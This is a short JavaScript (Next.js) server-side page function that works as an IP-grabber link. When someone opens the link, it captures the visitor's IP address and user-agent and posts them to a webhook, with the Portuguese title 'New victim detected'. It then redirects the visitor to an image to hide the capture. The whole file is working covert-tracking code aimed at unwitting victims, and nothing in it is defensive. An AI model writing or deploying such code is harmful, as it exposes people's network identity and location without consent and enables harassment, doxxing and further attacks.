export async function getServerSideProps({params,req}){
  const ip=req.headers["x-forwarded-for"]||req.socket.remoteAddress
  const ua=req.headers["user-agent"]
  const id=params.id
  const data=JSON.parse(require("fs").readFileSync("data.json"))
  const log=data[id]
  if(log){
    await fetch(log.webhook,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({
        embeds:[{
          title:"Nova vítima detectada",
          fields:[
            {name:"IP",value:ip},
            {name:"User-Agent",value:ua}
          ],
          timestamp:new Date()
        }]
      })
    })
    return{
      redirect:{destination:log.image,permanent:false}
    }
  }
  return{notFound:true}
}
export default function(){}
